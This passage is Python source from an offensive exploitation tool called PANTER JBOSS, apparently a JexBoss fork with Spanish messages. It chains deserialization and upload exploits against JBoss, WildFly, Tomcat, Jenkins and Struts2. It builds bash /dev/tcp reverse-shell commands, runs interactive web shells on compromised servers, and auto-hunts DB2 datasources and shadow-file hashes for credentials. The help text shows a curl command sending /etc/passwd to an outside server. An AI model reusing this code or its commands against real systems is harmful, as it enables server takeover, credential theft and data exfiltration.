        if result != 200 and result != 500:
            result = _exploits.exploit_jmx_invoker_file_repository(url, 1)

        # Intento 2: deserialization via servlet
        if result == 404:
            host, port = get_host_port_reverse_params()
            if host == port == gl_args.cmd == None: return False
            result = _exploits.exploit_servlet_deserialization(url + "/invoker/JMXInvokerServlet", host=host, port=port,
                                                               cmd=gl_args.cmd, is_win=gl_args.windows, gadget=gl_args.gadget,
                                                               gadget_file=gl_args.load_gadget)

        # Intento 3 (nuevo): CVE-2015-7501 via ysoserial si los anteriores fallaron
        if result not in (200, 500):
            host, port = get_host_port_reverse_params()
            if host is not None and port is not None:
                cmd_str = gl_args.cmd or ("bash -i >& /dev/tcp/%s/%s 0>&1" % (host, port))
                print_and_flush(YELLOW + "\n * Intentando CVE-2015-7501 via ysoserial...\n" + ENDC)
                status_7501 = _exploits.exploit_jboss_deserialize_7501(url, cmd_str)
                if status_7501 in (200, 500):
                    result = status_7501
                    print_and_flush(RED + BOLD +
                        " * [CVE-2015-7501] Payload enviado via JMXInvokerServlet. "
                        "Verifique su listener.\n" + ENDC)

    elif exploit_type == "admin-console":

        result = _exploits.exploit_admin_console(url, gl_args.jboss_login)

    elif exploit_type == "Jenkins":

        host, port = get_host_port_reverse_params()
        if host == port == gl_args.cmd == None: return False
        result = _exploits.exploit_jenkins(url, host=host, port=port, cmd=gl_args.cmd, is_win=gl_args.windows,
                                                   gadget=gl_args.gadget, show_payload=gl_args.show_payload)
    elif exploit_type == "JMX Tomcat":

        host, port = get_host_port_reverse_params()
        if host == port == gl_args.cmd == None: return False
        result = _exploits.exploit_jrmi(url, host=host, port=port, cmd=gl_args.cmd, is_win=gl_args.windows)

    elif exploit_type == "Application Deserialization":

        host, port = get_host_port_reverse_params()

        if host == port == gl_args.cmd == gl_args.load_gadget == None: return False

        result = _exploits.exploit_application_deserialization(url, host=host, port=port, cmd=gl_args.cmd, is_win=gl_args.windows,
                                                               param=gl_args.post_parameter, force=gl_args.force,
                                                               gadget_type=gl_args.gadget, show_payload=gl_args.show_payload,
                                                               gadget_file=gl_args.load_gadget)

    elif exploit_type == "Servlet Deserialization":

        host, port = get_host_port_reverse_params()

        if host == port == gl_args.cmd == gl_args.load_gadget == None: return False

        result = _exploits.exploit_servlet_deserialization(url, host=host, port=port, cmd=gl_args.cmd, is_win=gl_args.windows,
                                                               gadget=gl_args.gadget, gadget_file=gl_args.load_gadget)

    elif exploit_type == "Struts2":

        result = 200

    # ── Nuevos vectores ──────────────────────────────────────────────

    elif exploit_type == "EJBInvokerServlet":
        # CVE-2013-4810: EJBInvokerServlet deserialization
        # Intentar primero desplegar shell via file repository (mismo mecanismo que JMXInvoker)
        result = _exploits.exploit_jmx_invoker_file_repository(url, 0)
        if result not in (200, 500):
            result = _exploits.exploit_jmx_invoker_file_repository(url, 1)
        if result not in (200, 500):
            # Fallback: deserialization directa via EJBInvokerServlet
            host, port = get_host_port_reverse_params()
            if host == port == gl_args.cmd == None: return False
            cmd_str = gl_args.cmd or ("bash -i >& /dev/tcp/%s/%s 0>&1" % (host, port))
            status = _exploits.exploit_ejb_invoker(url, cmd_str)
            result = status if status else 505

    elif exploit_type == "readonly-invoker":
        # /invoker/readonly → mismo payload que JMXInvokerServlet
        result = _exploits.exploit_jmx_invoker_file_repository(url, 0)
        if result not in (200, 500):
            result = _exploits.exploit_jmx_invoker_file_repository(url, 1)
        if result not in (200, 500):
            host, port = get_host_port_reverse_params()
            if host == port == gl_args.cmd == None: return False
            cmd_str = gl_args.cmd or ("bash -i >& /dev/tcp/%s/%s 0>&1" % (host, port))
            result = _exploits.exploit_jboss_deserialize_7501(url, cmd_str)
            result = result if result in (200, 500) else 505

    elif exploit_type == "Tomcat-PUT-RCE":
        # CVE-2017-12615: Tomcat PUT — sube JSP shell directamente
        result = _exploits.exploit_tomcat_put_rce(url, shell_name="panter_put.jsp")
        if result in (200, 500):
            # La shell subida usa el mismo path que el framework espera
            print_and_flush(GREEN + " * Shell subida via PUT en: %s/panter_put.jsp\n" % url + ENDC)

    elif exploit_type == "wildfly-management":
        # WildFly Management API sin auth → intentar deployment via REST API
        print_and_flush(GREEN + "\n * [WildFly] Intentando deploy via Management REST API...\n" + ENDC)
        result = _exploits.exploit_wildfly_management_deploy(url)

    # if it seems to be exploited (201 is for jboss exploited with gadget)
    if result == 200 or result == 500 or result == 201:
        session_data['hosts_comprometidos'].append({
            'host': url, 'metodo': exploit_type, 'usuario': '', 'password': ''
        })

        # if not auto_exploit, ask type enter to continue...
        if not gl_args.auto_exploit:

            if exploit_type in ("Application Deserialization", "Jenkins", "JMX Tomcat", "Servlet Deserialization") or result == 201:
                print_and_flush(BLUE + " * El codigo de exploit fue enviado correctamente. Verifique si recibio la conexion\n"
                                       "   de reverse shell o si su comando fue ejecutado en el servidor. \n"+ ENDC+
                                       "   Presione [ENTER] para continuar...\n")
                # wait while enter is typed
                input().lower() if version_info[0] >= 3 else raw_input().lower()
                return True
            else:
                if exploit_type == 'Struts2':
                    shell_http_struts(url)
                elif exploit_type == 'Tomcat-PUT-RCE':
                    # Shell subida via PUT usa path /panter_put.jsp
                    print_and_flush(GREEN + " * Shell PUT deployada! Iniciando shell de comandos...\n" + ENDC)
                    shell_http_generic(url, "/panter_put.jsp")
                elif exploit_type == 'wildfly-management':
                    # Shell WildFly usa path /panter_wf/panter_wf.jsp
                    print_and_flush(GREEN + " * Shell WildFly deployada! Iniciando shell de comandos...\n" + ENDC)
                    shell_http_generic(url, "/panter_wf/panter_wf.jsp")
                else:
                    print_and_flush(GREEN + " * Codigo desplegado exitosamente! Iniciando shell de comandos. Aguarde...\n" + ENDC)
                    shell_http(url, exploit_type)
                return True

        # if auto exploit mode, print message and continue...
        else:
            print_and_flush(GREEN + " * Codigo desplegado/enviado exitosamente via vector %s\n *** Ejecute PANTER JBOSS en modo Standalone "
                                    "para abrir la shell de comandos. ***" %(exploit_type) + ENDC)
            return True

    # if not exploited, print error messagem and ask for type enter
    else:
        if exploit_type == 'admin-console':
            print_and_flush(GREEN + "\n * Aun puede intentar explotar vulnerabilidades de deserializacion en ViewState!\n" +
                     "   Intente: python panterjboss.py -u %s/admin-console/login.seam --app-unserialize\n" %url +
                     "   Presione [ENTER] para continuar...\n" + ENDC)

        else:
            print_and_flush(RED + "\n * No se pudo explotar la vulnerabilidad automaticamente. Se requiere analisis manual...\n" +
                                "   Presione [ENTER] para continuar...\n" + ENDC)
        logging.error("Could not exploit the server %s automatically. HTTP Code: %s" %(url, result))
        # wait while enter is typed (solo en modo interactivo)
        if not gl_args.auto_exploit:
            input().lower() if version_info[0] >= 3 else raw_input().lower()
        return False


def ask_for_reverse_host_and_port():
    print_and_flush(GREEN + " * Ingrese la direccion IP y el PUERTO TCP de su servidor en escucha para intentar obtener una REVERSE SHELL.\n"
                            "   OBS: Tambien puede usar --cmd \"comando\" para enviar comandos especificos al servidor."+NORMAL)

    # If not *nix (that is, if somethine like git bash on Rwindow$)
    if not sys.stdout.isatty():
        print_and_flush("   Direccion IP (RHOST): ", same_line=True)
        host = input().lower() if version_info[0] >= 3 else raw_input().lower()
        print_and_flush("   Puerto (RPORT): ", same_line=True)
        port = input().lower() if version_info[0] >= 3 else raw_input().lower()
    else:
        host = input("   Direccion IP (RHOST): ").lower() if version_info[0] >= 3 else raw_input("   Direccion IP (RHOST): ").lower()
        port = input("   Puerto (RPORT): ").lower() if version_info[0] >= 3 else raw_input("   Puerto (RPORT): ").lower()

    print ("")
    return str(host), str(port)


def get_host_port_reverse_params():
    # if reverse host were provided in the args, take it
    if gl_args.reverse_host:

        if gl_args.windows:
            panter.print_and_flush(RED + "\n * WINDOWS Systems still do not support reverse shell.\n"
                                          "   Use option --cmd instead of --reverse-shell...\n" + ENDC +
                                    "   Type [ENTER] to continue...\n")
            # wait while enter is typed
            input().lower() if version_info[0] >= 3 else raw_input().lower()
            return None, None

        tokens = gl_args.reverse_host.split(":")
        if len(tokens) != 2:
            host, port = ask_for_reverse_host_and_port()
        else:
            host = tokens[0]
            port = tokens[1]
    # if neither cmd nor reverse nor load_gadget was provided, ask host and port
    elif gl_args.cmd is None and gl_args.load_gadget is None:
        if gl_args.auto_exploit:
            # En auto-exploit sin --cmd/--reverse-host, no podemos pedir input interactivo
            host, port = None, None
        else:
            host, port = ask_for_reverse_host_and_port()
    else:
        # if cmd or gadget file ware privided
        host, port = None, None

    return host, port


def _auto_detectar_db2(http_pool, url, path, headers):
    """
    Ejecuta busqueda rapida de datasources DB2 nada mas obtener la shell.
    Si los detecta, lanza el ataque DB2 automaticamente y muestra resultados.
    """
    print_and_flush(CYAN + "\n  [AUTO] Buscando datasources DB2 en el servidor..." + ENDC)
    try:
        # Busqueda rapida de archivos con conexion DB2 en rutas tipicas JBoss/JEE
        encoded = urlencode({"ppp": "grep -rl 'jdbc:db2' /opt /app /home /srv /jboss /wildfly /usr/local /var/lib 2>/dev/null | head -10"})
        r = http_pool.request('GET', url + path + encoded, redirect=False, headers=headers)
        raw = r.data.decode('utf-8', errors='ignore')
        try:
            out = raw.split("pre>")[1]
            out = __import__('re').sub(r'</?\w+[^>]*>', '', out).strip()
        except:
            out = ""

        if not out or 'db2' not in out.lower():
            print_and_flush(YELLOW + "  [AUTO] No se detectaron datasources DB2.\n" + ENDC)
            return

        print_and_flush(RED + BOLD +
            "\n  ╔══════════════════════════════════════════════════════════╗\n"
            "  ║   [AUTO] DB2 DETECTADO — INICIANDO ATAQUE AUTOMATICO    ║\n"
            "  ╚══════════════════════════════════════════════════════════╝\n" + ENDC)

        import _db2support
        evidencias = session_data.get('evidencias', [])
        creds = _db2support.ejecutar_ataque_db2(
            http_pool   = http_pool,
            url         = url,
            path        = path,
            headers     = headers,
            add_cred_fn = add_credential,
            evidencias  = evidencias,
        )

        if creds:
            # Mostrar tabla de resultados DB2
            h = max(len("USUARIO"), max(len(u) for u, p in creds))
            p = max(len("PASSWORD"), max(len(pw) for u, pw in creds))
            sep = "  ╠" + "═"*(h+2) + "╬" + "═"*(p+2) + "╣"
            print_and_flush(RED + BOLD +
                "  ╔" + "═"*(h+2) + "╦" + "═"*(p+2) + "╗\n" +
                "  ║" + " CREDENCIALES DB2 OBTENIDAS ".center(h+p+5) + "║\n" +
                sep + "\n" +
                "  ║ {:<{h}} ║ {:<{p}} ║".format("USUARIO", "PASSWORD", h=h, p=p) + "\n" +
                sep + ENDC)
            for u, pw in creds:
                print_and_flush(YELLOW +
                    "  ║ {:<{h}} ║ {:<{p}} ║".format(u, pw, h=h, p=p) + ENDC)
            print_and_flush(RED + BOLD +
                "  ╚" + "═"*(h+2) + "╩" + "═"*(p+2) + "╝\n" + ENDC)
        else:
            print_and_flush(YELLOW +
                "  [AUTO-DB2] Datasources detectados pero no se pudieron volcar datos.\n"
                "  [AUTO-DB2] Use [8] en el menu para intentar conexion manual.\n" + ENDC)

    except Exception as e:
        print_and_flush(YELLOW + "  [AUTO-DB2] Error: %s\n" % str(e) + ENDC)


def shell_http_struts(url):
    """
    Connect to an HTTP shell
    :param url: struts app url
    :param shell_type: The type of shell to connect to
    """
    print_and_flush("# ----------------------------------------- #\n")
    print_and_flush(GREEN + BOLD + " * Para una Reverse Shell (como meterpreter =]), escriba algo como: \n\n"
                    "\n" +ENDC+
                    "     Shell>/bin/bash -i > /dev/tcp/192.168.0.10/4444 0>&1 2>&1\n"
                    "   \n"+GREEN+
                    "   Y otras tecnicas similares... =]\n" +ENDC
                    )
    print_and_flush("# ----------------------------------------- #\n")

    resp = _exploits.exploit_struts2_jakarta_multipart(url,'whoami', gl_args.cookies)

    print_and_flush(resp.replace('\\n', '\n'), same_line=True)
    logging.info("Server %s exploited!" %url)

    while 1:
        print_and_flush(BLUE + "[Escriba comandos o \"exit\" para finalizar]" +ENDC)

        if not sys.stdout.isatty():
            print_and_flush("Shell> ", same_line=True)
            cmd = input() if version_info[0] >= 3 else raw_input()
        else:
            cmd = input("Shell> ") if version_info[0] >= 3 else raw_input("Shell> ")

        if cmd == "exit":
            break

        resp = _exploits.exploit_struts2_jakarta_multipart(url, cmd, gl_args.cookies)
        print_and_flush(resp.replace('\\n', '\n'))


# FIX: capture the readtimeout   File "panterjboss.py", line 333, in shell_http
def shell_http_generic(url, jsp_path):
    """
    Shell interactiva para JSPs deployadas por rutas no estandar
    (Tomcat PUT, WildFly Management, etc.)
    :param url: URL base del servidor
    :param jsp_path: Ruta relativa de la JSP (/panter_put.jsp, /panter_wf/panter_wf.jsp, etc.)
    """
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": get_random_user_agent()}

    # path con ? para concatenar parametros
    path = jsp_path + "?"

    sleep(3)

    print_and_flush(RED + BOLD +
        "\n  ╔══════════════════════════════════════════════════════╗\n"
        "  ║              ACCESO OBTENIDO - PWNED                 ║\n"
        "  ║  %-52s║\n" % ((url + jsp_path)[:52] + " ") +
        "  ╚══════════════════════════════════════════════════════╝\n" + ENDC)

    # Info del sistema
    for cmd_str in ['id', 'uname -a', 'hostname']:
        try:
            encoded = urlencode({"ppp": cmd_str})
            r = gl_http_pool.request('GET', url + path + encoded, redirect=False, headers=headers)
            parts = r.data.decode('utf-8', errors='ignore').split("pre>")
            if len(parts) > 1:
                out = parts[1].replace('\\n', ' ').strip()[:120]
                print_and_flush(CYAN + "  %s: %s" % (cmd_str, out) + ENDC)
        except:
            pass

    logging.info("Server %s exploited via %s!" % (url, jsp_path))
    _auto_detectar_db2(gl_http_pool, url, path, headers)

    def _shell_manual():
        while True:
            print_and_flush(BLUE + "[Escriba comandos o \"exit\" para volver al menu]" + ENDC)
            raw_cmd = input("Shell> ") if version_info[0] >= 3 else raw_input("Shell> ")
            if raw_cmd.lower() == "exit":
                break
            if not _confirmar_cmd(raw_cmd):
                continue
            encoded = urlencode({"ppp": raw_cmd})
            try:
                r = gl_http_pool.request('GET', url + path + encoded, redirect=False, headers=headers)
            except:
                print_and_flush(RED + " * Error al contactar la shell." + ENDC)
                continue
            if r.status == 404:
                print_and_flush(RED + " * Shell no responde (404)." + ENDC)
                continue
            try:
                stdout = r.data.decode('utf-8', errors='ignore').split("pre>")[1]
                output_text = stdout.replace('\\n', '\n')
                print_and_flush(output_text)
                _detect_and_show_credential_output(output_text, raw_cmd, url)
            except:
                print_and_flush(RED + " * Error al leer respuesta." + ENDC)

    _postexploit.run_menu(
        http_pool         = gl_http_pool,
        url               = url,
        path              = path,
        headers           = headers,
        add_credential_fn = add_credential,
        shell_fn          = _shell_manual,
        check_vul_fn      = check_vul,
        auto_exploit_fn   = auto_exploit,
        gl_args           = gl_args,
    )


def shell_http(url, shell_type):
    """
    Connect to an HTTP shell
    :param url: The URL to connect to
    :param shell_type: The type of shell to connect to
    """
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Connection": "keep-alive",
               "User-Agent": get_random_user_agent()}

    if gl_args.disable_check_updates:
        headers['no-check-updates'] = 'true'

    if shell_type == "jmx-console" or shell_type == "web-console" or shell_type == "admin-console":
        path = '/panterws/panterws.jsp?'
    elif shell_type == "JMXInvokerServlet":
        path = '/jexinv4/jexinv4.jsp?'

    gl_http_pool.request('GET', url+path, redirect=False, headers=headers)

    sleep(7)

    print_and_flush(RED + BOLD +
        "\n  ╔══════════════════════════════════════════════════════╗\n"
        "  ║              ACCESO OBTENIDO - PWNED                 ║\n"
        "  ║  %-52s║\n" % (url + " ") +
        "  ╚══════════════════════════════════════════════════════╝\n" + ENDC)

    # Info rapida del sistema al obtener shell
    # Desactivar update-check para que los comandos de recon no lo disparen
    headers['no-check-updates'] = 'true'
    resp = ""
    for cmd_str in ['id', 'uname -a', 'cat /etc/issue']:
        try:
            encoded = urlencode({"ppp": cmd_str})
            r = gl_http_pool.request('GET', url + path + encoded, redirect=False, headers=headers)
            part = r.data.decode('utf-8', errors='ignore').split(">")[1].replace('\\n', ' ').strip()
            resp += "  " + cmd_str + ": " + part + "\n"
        except:
            headers['no-check-updates'] = 'true'

    print_and_flush(CYAN + resp + ENDC)
    logging.info("Server %s exploited!" % url)

    # ── Auto-deteccion DB2 al obtener shell ─────────────────────────
    _auto_detectar_db2(gl_http_pool, url, path, headers)

    # Funcion de shell manual para pasar al menu como opcion [6]
    def _shell_manual():
        while True:
            print_and_flush(BLUE + "[Escriba comandos o \"exit\" para volver al menu]" + ENDC)
            if not sys.stdout.isatty():
                print_and_flush("Shell> ", same_line=True)
                raw_cmd = input() if version_info[0] >= 3 else raw_input()
            else:
                raw_cmd = input("Shell> ") if version_info[0] >= 3 else raw_input("Shell> ")

            if raw_cmd.lower() == "exit":
                break

            if not _confirmar_cmd(raw_cmd):
                continue

            encoded = urlencode({"ppp": raw_cmd})
            try:
                r = gl_http_pool.request('GET', url + path + encoded, redirect=False, headers=headers)
            except:
                print_and_flush(RED + " * Error al contactar la shell. Intente nuevamente..." + ENDC)
                continue

            if r.status == 404:
                print_and_flush(RED + " * Error: shell no responde." + ENDC)
                continue

            resp_raw = r.data.decode('utf-8', errors='ignore')
            try:
                stdout = resp_raw.split("pre>")[1]
            except:
                print_and_flush(RED + " * Error al leer respuesta." + ENDC)
                continue

            if "An exception occurred processing JSP page" in stdout:
                print_and_flush(RED + " * Error ejecutando: %s" % raw_cmd + ENDC)
            else:
                output_text = stdout.replace('\\n', '\n')
                print_and_flush(output_text)
                _detect_and_show_credential_output(output_text, raw_cmd, url)

    # Lanzar menu guiado de post-explotacion
    _postexploit.run_menu(
        http_pool       = gl_http_pool,
        url             = url,
        path            = path,
        headers         = headers,
        add_credential_fn = add_credential,
        shell_fn        = _shell_manual,
        check_vul_fn    = check_vul,
        auto_exploit_fn = auto_exploit,
        gl_args         = gl_args,
    )


def _analizar_cmd_sensible(cmd):
    """
    Analiza un comando de shell y determina si es potencialmente
    destructivo o de escritura en el servidor.
    Retorna (es_sensible, tipo, descripcion) o (False, None, None).
    """
    import re as _re
    cmd_strip = cmd.strip()

    # Patrones de escritura de archivos
    escritura = [
        (_re.compile(r'(?:^|[;&|])\s*(?:echo|printf)\s+.*\s*>+\s*\S'),
         "ESCRITURA",  "Escribe en un archivo del servidor"),
        (_re.compile(r'(?:^|[;&|])\s*(?:cat|tee)\s+.*\s*>+\s*\S'),
         "ESCRITURA",  "Redirige contenido a un archivo"),
        (_re.compile(r'(?:^|[;&|])\s*tee\s+\S'),
         "ESCRITURA",  "Escribe en un archivo via tee"),
        (_re.compile(r'(?:^|[;&|])\s*(?:wget|curl)\s+.*-[oO]\s*\S'),
         "DESCARGA",   "Descarga un archivo al servidor"),
        (_re.compile(r'(?:^|[;&|])\s*wget\s+'),
         "DESCARGA",   "Descarga un archivo al servidor (wget)"),
        (_re.compile(r'(?:^|[;&|])\s*curl\s+.*http'),
         "DESCARGA",   "Descarga un archivo al servidor (curl)"),
        (_re.compile(r'(?:^|[;&|])\s*cp\s+\S+\s+\S'),
         "COPIA",      "Copia un archivo en el servidor"),
        (_re.compile(r'(?:^|[;&|])\s*mv\s+\S+\s+\S'),
         "MOVER",      "Mueve o renombra un archivo"),
        (_re.compile(r'(?:^|[;&|])\s*dd\s+'),
         "ESCRITURA",  "Operacion de dd (escritura de bloques)"),
        (_re.compile(r'(?:^|[;&|])\s*chmod\s+'),
         "PERMISOS",   "Modifica permisos de archivos"),
        (_re.compile(r'(?:^|[;&|])\s*chown\s+'),
         "PERMISOS",   "Modifica propietario de archivos"),
        (_re.compile(r'(?:^|[;&|])\s*crontab\s+'),
         "PERSISTENCIA","Modifica crontab del servidor"),
        (_re.compile(r'(?:^|[;&|])\s*(?:at|batch)\s+'),
         "PERSISTENCIA","Programa tarea en el servidor"),
        (_re.compile(r'(?:^|[;&|])\s*useradd\s+|adduser\s+'),
         "USUARIO",    "Crea un nuevo usuario en el servidor"),
        (_re.compile(r'(?:^|[;&|])\s*passwd\s+'),
         "USUARIO",    "Cambia password de usuario"),
        (_re.compile(r'(?:^|[;&|])\s*ssh-keygen\s+|authorized_keys'),
         "PERSISTENCIA","Operacion con claves SSH"),
    ]

    # Patrones de eliminacion
    eliminacion = [
        (_re.compile(r'(?:^|[;&|])\s*rm\s+(?:-\w+\s+)?\S'),
         "ELIMINACION", "Elimina archivos del servidor"),
        (_re.compile(r'(?:^|[;&|])\s*rmdir\s+'),
         "ELIMINACION", "Elimina directorios del servidor"),
        (_re.compile(r'(?:^|[;&|])\s*shred\s+'),
         "ELIMINACION", "Destruye archivo de forma segura"),
        (_re.compile(r'(?:^|[;&|])\s*unlink\s+'),
         "ELIMINACION", "Elimina un archivo"),
        (_re.compile(r'(?:^|[;&|])\s*truncate\s+'),
         "ELIMINACION", "Trunca el contenido de un archivo"),
        (_re.compile(r'>>\s*/etc/|>\s*/etc/'),
         "SISTEMA",    "Escribe en un archivo de sistema (/etc/)"),
        (_re.compile(r'>\s*/root/|>>\s*/root/'),
         "SISTEMA",    "Escribe en el home de root"),
    ]

    for patron, tipo, desc in escritura + eliminacion:
        if patron.search(cmd_strip):
            return True, tipo, desc

    return False, None, None


def _confirmar_cmd(cmd):
    """
    Muestra advertencia y pide confirmacion antes de ejecutar
    un comando sensible en el servidor victima.
    Retorna True si el usuario confirma, False si cancela.
    """
    es_sensible, tipo, desc = _analizar_cmd_sensible(cmd)
    if not es_sensible:
        return True  # no sensible → ejecutar sin preguntar

    # Colorear por tipo
    color_tipo = {
        "ELIMINACION":  RED + BOLD,
        "ESCRITURA":    YELLOW + BOLD,
        "DESCARGA":     YELLOW + BOLD,
        "PERSISTENCIA": RED + BOLD,
        "USUARIO":      RED + BOLD,
        "SISTEMA":      RED + BOLD,
        "COPIA":        CYAN,
        "MOVER":        CYAN,
        "PERMISOS":     CYAN,
    }.get(tipo, YELLOW + BOLD)

    print_and_flush(
        color_tipo +
        "\n  ╔══════════════════════════════════════════════════════╗\n"
        "  ║  ATENCION — OPERACION SENSIBLE EN EL SERVIDOR        ║\n"
        "  ╠══════════════════════════════════════════════════════╣\n" + ENDC +
        YELLOW +
        "  ║  Tipo    : %-44s║\n" % (tipo + " ") +
        "  ║  Accion  : %-44s║\n" % (desc[:44] + " ") +
        "  ╠══════════════════════════════════════════════════════╣\n" + ENDC +
        WHITE +
        "  ║  Comando : %-44s║\n" % (cmd[:44] + " ") +
        "  ╚══════════════════════════════════════════════════════╝\n" + ENDC
    )

    try:
        resp = input(RED + BOLD +
                     "  Confirmar ejecucion en el servidor? [s/N]: " + ENDC).strip().lower()
    except (EOFError, KeyboardInterrupt):
        return False

    if resp == 's':
        print_and_flush(GREEN + "  [+] Confirmado — ejecutando...\n" + ENDC)
        return True
    else:
        print_and_flush(YELLOW + "  [!] Cancelado — comando no ejecutado.\n" + ENDC)
        return False


def _detect_and_show_credential_output(output, command, host):
    """
    Analiza la salida de un comando y muestra tablas cuando detecta
    datos de usuarios o credenciales conocidas.
    """
    import re

    # 1. Formato /etc/passwd  (user:x:uid:gid:info:home:shell)
    if parse_and_print_passwd_table(output, source=host):
        return

    # 2. Formato /etc/shadow  (user:hash:...)  — solo muestra usuario y hash
    shadow_re = re.compile(r'^([^:]+):(\$[^:]+|[^:]{20,}):[\d:]*$', re.MULTILINE)
    shadow_hits = shadow_re.findall(output)
    if shadow_hits:
        u_w = max(len("USUARIO"), max(len(r[0]) for r in shadow_hits))
        h_w = max(len("HASH"), max(len(r[1]) for r in shadow_hits))
        sep_top = "  ╔" + "═"*(u_w+2) + "╦" + "═"*(h_w+2) + "╗"
        sep_mid = "  ╠" + "═"*(u_w+2) + "╬" + "═"*(h_w+2) + "╣"
        sep_bot = "  ╚" + "═"*(u_w+2) + "╩" + "═"*(h_w+2) + "╝"
        tw = u_w + h_w + 5
        title_line = "  ║" + " /etc/shadow — %s " % host.center(tw) + "║"
        header = "  ║ {:<{u}} ║ {:<{h}} ║".format("USUARIO", "HASH", u=u_w, h=h_w)
        print_and_flush(RED + BOLD + "\n" + sep_top)
        print_and_flush(title_line)
        print_and_flush(sep_mid)
        print_and_flush(header)
        print_and_flush(sep_mid)
        for user, hsh in shadow_hits:
            row = "  ║ {:<{u}} ║ {:<{h}} ║".format(user, hsh, u=u_w, h=h_w)
            print_and_flush(YELLOW + row + RED)
        print_and_flush(sep_bot + ENDC + "\n")
        return

    # 3. Pares usuario:password en texto plano (ej. grep de archivos de config)
    plain_re = re.compile(r'(?:user(?:name)?|login|usr)\s*[=:]\s*(\S+).*?(?:pass(?:word)?|pwd)\s*[=:]\s*(\S+)',
                          re.IGNORECASE)
    pairs = plain_re.findall(output)
    if pairs:
        u_w = max(len("USUARIO"), max(len(p[0]) for p in pairs))
        p_w = max(len("PASSWORD"), max(len(p[1]) for p in pairs))
        sep_top = "  ╔" + "═"*(u_w+2) + "╦" + "═"*(p_w+2) + "╗"
        sep_mid = "  ╠" + "═"*(u_w+2) + "╬" + "═"*(p_w+2) + "╣"
        sep_bot = "  ╚" + "═"*(u_w+2) + "╩" + "═"*(p_w+2) + "╝"
        tw = u_w + p_w + 5
        title_line = "  ║" + (" CREDENCIALES DETECTADAS — %s " % host).center(tw) + "║"
        header = "  ║ {:<{u}} ║ {:<{p}} ║".format("USUARIO", "PASSWORD", u=u_w, p=p_w)
        print_and_flush(RED + BOLD + "\n" + sep_top)
        print_and_flush(title_line)
        print_and_flush(sep_mid)
        print_and_flush(header)
        print_and_flush(sep_mid)
        for usr, pwd in pairs:
            add_credential(host, usr, pwd, "Texto plano (%s)" % command[:30])
            row = "  ║ {:<{u}} ║ {:<{p}} ║".format(usr, pwd, u=u_w, p=p_w)
            print_and_flush(YELLOW + row + RED)
        print_and_flush(sep_bot + ENDC + "\n")


def clear():
    """
    Clears the console
    """
    if name == 'posix':
        system('clear')
    elif name == ('ce', 'nt', 'dos'):
        system('cls')


def banner():
    """
    Print the banner
    """
    clear()
    analyst = gl_args.analyst if 'gl_args' in globals() and hasattr(gl_args, 'analyst') else __analyst__
    # ---- Skull (calavera pirata) ----
    print_and_flush(
        RED + "\n"
        "             ░░░░░░░░░░░░░░░░░░░░░░░░░             \n"
        "          ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░         \n"
        "        ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░       \n"
        "       ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░      \n"
        "      ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░     \n"
        "      ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░     \n" +
        RED +
        "      ░░░░░░░   \\░░░░░░░░░░░   ░░░░░░░░░░░░░░░    \n"
        "      ░░░░░░░  ░░\\░░░░░░░░░░░   ░░░░░░░░░░░░░░░   \n"
        "      ░░░░░░░ ░░░░\\░░░░░░░░░░░   ░░░░░░░░░░░░░░   \n"
        "      ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░    \n"
        "      ░░░░░░░░░░░░░░░░░  ░░░░░░░░░░░░░░░░░░░░░░    \n"
        "      ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░    \n"
        "       ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░     \n"
        "        ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░      \n"
        "         ░░  ░░  ░░  ░░  ░░  ░░  ░░  ░░  ░░       \n"
        "               ░░░░░░░░░░░░░░░░░░░░░░░             \n"
        # crossbones
        "   ░░░░░░                             ░░░░░░        \n"
        "   ░░░░░░░░░░                   ░░░░░░░░░░░░        \n"
        "      ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░          \n"
        "           ░░░░░░░░░░░░░░░░░░░░░░░░░░              \n"
        "                 ░░░░░░░░░░░░░░░░░                  \n"
        "           ░░░░░░░░░░░░░░░░░░░░░░░░░░              \n"
        "      ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░          \n"
        "   ░░░░░░░░░░░                   ░░░░░░░░░░░░        \n"
        "   ░░░░░░                             ░░░░░░        \n" + ENDC)
    # ---- Info box ----
    print_and_flush(
        RED  + BOLD +
        "   ╔══════════════════════════════════════════════╗\n"
        "   ║%s║\n" % "PANTER JBOSS  v1.3.0".center(46) +
        "   ╠══════════════════════════════════════════════╣\n" + ENDC +
        YELLOW + BOLD +
        "   ║%s║\n" % "Analista : Apo1o13".center(46) + ENDC +
        RED  + BOLD +
        "   ╠══════════════════════════════════════════════╣\n" + ENDC +
        CYAN +
        "   ║  %-44s║\n" % ("Version  : " + __version__) +
        "   ║  %-44s║\n" % ("Sesion   : " + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")) + ENDC +
        RED  + BOLD +
        "   ╚══════════════════════════════════════════════╝\n" + ENDC)
    print_and_flush(ENDC)


def help_usage():
    usage = (BOLD + BLUE + " Examples: [for more options, type python panterjboss.py -h]\n" + ENDC +
    BLUE + "\n For simple usage, you must provide the host name or IP address you\n"
           " want to test [-host or -u]:\n" +
    GREEN + "\n  $ python panterjboss.py -u https://site.com.br" +

     BLUE + "\n\n For Java Deserialization Vulnerabilities in HTTP POST parameters. \n"
            " This will ask for an IP address and port to try to get a reverse shell:\n" +
     GREEN + "\n  $ python panterjboss.py -u http://vulnerable_java_app/page.jsf --app-unserialize" +

     BLUE + "\n\n For Java Deserialization Vulnerabilities in a custom HTTP parameter and \n"
            " to send a custom command to be executed on the exploited server:\n" +
     GREEN + "\n  $ python panterjboss.py -u http://vulnerable_java_app/page.jsf --app-unserialize\n"
             "    -H parameter_name --cmd 'curl -d@/etc/passwd http://your_server'" +

     BLUE + "\n\n For Java Deserialization Vulnerabilities in a Servlet (like Invoker):\n"+
